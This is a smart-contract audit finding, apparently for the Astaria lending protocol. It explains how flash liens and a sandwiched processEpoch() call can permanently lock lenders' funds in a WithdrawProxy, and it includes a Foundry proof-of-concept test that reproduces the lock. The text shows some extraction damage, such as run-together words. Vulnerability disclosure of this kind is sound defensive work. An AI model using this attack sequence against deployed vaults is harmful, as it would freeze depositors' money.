# [H] 5.2.4 WithdrawProxyfunds can be locked

## Summary
Severity: High
Source: https://github.com/tintinweb/smart-contract-vulndb
Type: audit-issue

## Details
**Severity:** High Risk
**Context:**

- WithdrawProxy.sol#L291-L293
- WithdrawProxy.sol#L329
- WithdrawProxy.sol#L383
- PublicVault.sol#L349
**Description:** If flash liens are allowed by a public vault, one call lockup the to be redeemed funds of aWithdraw-
Proxyby sandwiching a call toprocessEpoch().
This attack goes as follows:
1. Assume the current epoch ise 1. A public vault lender request to withdraw ate 1 which causesWthe withdraw
proxy for this epoch to be deployed and let time pass.
2. Someone opens a lien and gets liquidated during this epoch such that its auction ends pass the next epoch
e 2 so thatW'sfinalAuctionEndbecomes non-zero and let time pass.
3. Processe 1 so that the current epoch to be processed next would bee 2.
4. Open a new lien for1 weiwith 0 duration.
5. Instantly processe 2. At this point theclaim()endpoint would be called onWto resetfinalAuctionEndto
0. At this point the current epoch would bee 3.


6. Back-run and instantly liquidate the lien created in step 4 to setW'sfinalAuctionEndto a non-zero value
    again.
SinceW'sclaim()endpoint is the only endpoint that resetsfinalAuctionEndto 0 and this endpoint can only be
called when the current epoch is the claimable epoch forWwhich ise 2 ,finalAuctionEndwould cannot be able
to be reset to 0 anymore as the epoch only increase in value. And so since theredeemandwithdrawendpoints of
theWithdrawProxyare guarded by theonlyWhenNoActiveAuction()modifier:

```
modifier onlyWhenNoActiveAuction() {
WPStorage storage s = _loadSlot();
// If auction funds have been collected to the WithdrawProxy
// but the PublicVault hasn't claimed its share, too much money will be sent to LPs
if (s.finalAuctionEnd != 0) {
// if finalAuctionEnd is 0, no auctions were added
revert InvalidState(InvalidStates.NOT_CLAIMED);
}
_;
}
```
TheWshareholders would not be able to exit their shares. All shares are locked unless the protocol admin pushes
updates to the current implementation.
// add the following test case to:
// file: src/test/LienTokenSettlementScenarioTest.t.sol
// make sure to also add the following import
// import {
// WithdrawProxy
// } from "core/WithdrawProxy.sol";
// Scenario 10: commitToLien -> liquidate w/ WithdrawProxy -> ...
function testScenario10() public {
TestNFT nft = new TestNFT(2);
address tokenContract = address(nft);
uint256 tokenIdOne = uint256(0);
uint256 tokenIdTwo = uint256(1);
// create a PublicVault with a 14-day epoch
address publicVault = _createPublicVault(
strategistOne,
strategistTwo,
14 days,
1e17
);
address lender = address(1);
vm.label(lender, "lender");
// lend 10 ether to the PublicVault as address(1)
_lendToVault(
Lender({addr: lender, amountToLend: 10 ether}),
payable(publicVault)
);
address lender2 = address(2);
vm.label(lender2, "lender");
// lend 10 ether to the PublicVault as address(2)
_lendToVault(
Lender({addr: lender2, amountToLend: 10 ether}),
payable(publicVault)
);


// skip 1 epoch
skip(14 days);

_signalWithdrawAtFutureEpoch(
lender,
payable(publicVault),
1 // epoch to redeem
);

{
console2.log("\n--- process epoch ---");
PublicVault(payable(publicVault)).processEpoch();
// current epoch should be 1
uint256 currentEpoch = PublicVault(payable(publicVault)).getCurrentEpoch();
emit log_named_uint("currentEpoch", currentEpoch);
assertEq(
currentEpoch,
1,
"The current epoch should be 1"
);
}

skip(1 days);

// borrow 5 eth against the dummy NFT
(, ILienToken.Stack memory stackOne) = _commitToLien({
vault: payable(publicVault),
strategist: strategistOne,
strategistPK: strategistOnePK,
tokenContract: tokenContract,
tokenId: tokenIdOne,
lienDetails: ILienToken.Details({
maxAmount: 50 ether,
rate: (uint256(1e16) * 150) / (365 days),
duration: 11 days,
maxPotentialDebt: 0 ether,
liquidationInitialAsk: 100 ether
}),
amount: 5 ether
});

// uint256 collateralId = tokenContract.computeId(tokenId);

skip(11 days);
OrderParameters memory listedOrderOne = _liquidate(stackOne);

IWithdrawProxy withdrawProxy = PublicVault(payable(publicVault))
.getWithdrawProxy(1);

{
(
uint256 withdrawRatio,
uint256 expected,
uint40 finalAuctionEnd,
uint256 withdrawReserveReceived
) = withdrawProxy.getState();
emit log_named_uint("finalAuctionEnd @ e_1", finalAuctionEnd);


}

{
skip(2 days);
console2.log("\n--- process epoch ---");
PublicVault(payable(publicVault)).processEpoch();
// current epoch should be 2
uint256 currentEpoch = PublicVault(payable(publicVault)).getCurrentEpoch();
emit log_named_uint("currentEpoch", currentEpoch);
assertEq(
currentEpoch,
2,
"The current epoch should be 2"
);
}

{
(
uint256 withdrawRatio,
uint256 expected,
uint40 finalAuctionEnd,
uint256 withdrawReserveReceived
) = withdrawProxy.getState();
uint256 withdrawReserve = PublicVault(payable(publicVault)).getWithdrawReserve();
emit log_named_uint("finalAuctionEnd @ e_1", finalAuctionEnd);
emit log_named_uint("withdrawReserve", withdrawReserve);

}

{
PublicVault(payable(publicVault)).transferWithdrawReserve();
uint256 withdrawReserve = PublicVault(payable(publicVault)).getWithdrawReserve();
emit log_named_uint("withdrawReserve", withdrawReserve);
}

{
// allow flash liens - liens that can be liquidated in the same block that was committed
IAstariaRouter.File[] memory files = new IAstariaRouter.File[](1);
files[0] = IAstariaRouter.File(
IAstariaRouter.FileType.MinLoanDuration,
abi.encode(uint256(0))
);
ASTARIA_ROUTER.fileBatch(files);
}

// borrow 5 eth against the dummy NFT
(, ILienToken.Stack memory stackTwo) = _commitToLien({
vault: payable(publicVault),
strategist: strategistOne,
strategistPK: strategistOnePK,
tokenContract: tokenContract,
tokenId: tokenIdTwo,
lienDetails: ILienToken.Details({
maxAmount: 50 ether,


rate: (uint256(1e16) * 150) / (365 days),
duration: 0 seconds,
maxPotentialDebt: 0 ether,
liquidationInitialAsk: 1 wei
}),
amount: 1 wei
});

{
skip(14 days);
console2.log("\n--- process epoch ---");
PublicVault(payable(publicVault)).processEpoch();
// current epoch should be 3
uint256 currentEpoch = PublicVault(payable(publicVault)).getCurrentEpoch();
emit log_named_uint("currentEpoch", currentEpoch);
assertEq(
currentEpoch,
3,
"The current epoch should be 3"
);
(
uint256 withdrawRatio,
uint256 expected,
uint40 finalAuctionEnd,
uint256 withdrawReserveReceived
) = withdrawProxy.getState();
// finalAuctionEnd will be non-zero
emit log_named_uint("finalAuctionEnd @ e_1", finalAuctionEnd);
}

console2.log("\n--- liquidate the flash lien corresponding to epoch 1 ---");
OrderParameters memory listedOrderTwo = _liquidate(stackTwo);

{
(
uint256 withdrawRatio,
uint256 expected,
uint40 finalAuctionEnd,
uint256 withdrawReserveReceived
) = withdrawProxy.getState();
// finalAuctionEnd will be non-zero
emit log_named_uint("finalAuctionEnd @ e_1", finalAuctionEnd);

}

// at this point`claim()`cannot be called for`withdrawProxy`since
// the current epoch does not equal to` 2 `which is the CLAIMABLE_EPOCH()
// for this withdraw proxy. and in fact it will never be since its current value
// is` 3 `and its value never decreases. This means`finalAuctionEnd`will never
// be reset to` 0 `and so`redeem`and`withdraw`endpoints cannot be called
// and the lender funds are locked in`withdrawProxy`.

{


```
uint256 lenderShares = withdrawProxy.balanceOf(lender);
vm.expectRevert(
abi.encodeWithSelector(WithdrawProxy.InvalidState.selector,
,! WithdrawProxy.InvalidStates.NOT_CLAIMED)
);
uint256 redeemedAssets = withdrawProxy.redeem(lenderShares, lender, lender);
}
}
```
